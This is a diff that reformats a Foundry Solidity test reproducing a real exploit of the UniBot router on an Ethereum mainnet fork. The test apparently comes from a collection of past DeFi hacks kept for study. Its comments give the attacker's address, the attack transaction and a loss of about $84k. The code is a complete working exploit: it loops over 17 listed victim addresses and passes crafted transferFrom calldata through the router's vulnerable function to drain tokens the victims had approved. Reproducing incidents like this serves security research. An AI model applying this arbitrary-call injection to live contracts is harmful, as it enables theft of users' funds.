@@ -7,16 +7,13 @@ import "./interface.sol";
 // @KeyInfo -- Total Lost : ~83,994 USD$
 // Attacker : https://etherscan.io/address/0x413e4fb75c300b92fec12d7c44e4c0b4faab4d04
 // Attack Contract : https://etherscan.io/address/0x2b326a17b5ef826fa4e17d3836364ae1f0231a6f
-// Attacker Transaction : 
+// Attacker Transaction :
 // https://etherscan.io/tx/0xcbe521aea28911fe9983030748028e12541e347b8b6b974d026fa5065c22f0cf
-
 
 // @Analysis
 // https://twitter.com/PeckShieldAlert/status/1719251390319796477
 
-interface IUniBotRouter {
-
-}
+interface IUniBotRouter {}
 
 // The hacker sent multiple transactions to attack, just taking the first transaction as an example.
 
@@ -28,15 +25,16 @@ contract IUniBotRouterExploit is Test {
     WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
     function setUp() public {
-        cheats.createSelectFork("https://rpc.ankr.com/eth",18467805);
+        cheats.createSelectFork("https://rpc.ankr.com/eth", 18_467_805);
 
         cheats.label(address(router), "UniBotRouter");
         cheats.label(address(UniBot), "UniBot Token");
     }
 
     function testExploit() public {
-
-        emit log_named_decimal_uint("Attacker UniBot balance before exploit", UniBot.balanceOf(address(this)), UniBot.decimals());
+        emit log_named_decimal_uint(
+            "Attacker UniBot balance before exploit", UniBot.balanceOf(address(this)), UniBot.decimals()
+        );
 
         address[] memory victims = new address[](17);
 
@@ -58,24 +56,24 @@ contract IUniBotRouterExploit is Test {
         victims[15] = 0x8a1Ee663e8Cd3F967D1814657A8858246ED31444;
         victims[16] = 0x92c3717A1318cf0e02883Ca0BAE73bd90469325A;
 
-
         bytes4 vulnFunctionSignature = hex"b2bd16ab";
         address[] memory first_param = new address[](4);
         first_param[0] = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
         first_param[1] = address(UniBot);
         first_param[2] = address(UniBot);
         first_param[3] = address(UniBot);
-        for (uint i = 0; i < victims.length; i++) {
+        for (uint256 i = 0; i < victims.length; i++) {
             uint256 allowance = UniBot.allowance(victims[i], address(router));
             uint256 balance = UniBot.balanceOf(victims[i]);
             balance = allowance < balance ? allowance : balance;
-            bytes memory transferFromData = abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), balance);
-            bytes memory data = abi.encodeWithSelector(vulnFunctionSignature, first_param,0,true,100_000, transferFromData,new address[](1));
-            (bool success,bytes memory result) = address(router).call(data);
-
+            bytes memory transferFromData =
+                abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), balance);
+            bytes memory data = abi.encodeWithSelector(
+                vulnFunctionSignature, first_param, 0, true, 100_000, transferFromData, new address[](1)
+            );
+            (bool success, bytes memory result) = address(router).call(data);
         }
         uint256 UniBotBalance = UniBot.balanceOf(address(this));
-        emit log_named_decimal_uint("Attacker UniBot balance after exploit", UniBotBalance , UniBot.decimals());
+        emit log_named_decimal_uint("Attacker UniBot balance after exploit", UniBotBalance, UniBot.decimals());
     }
-
 }
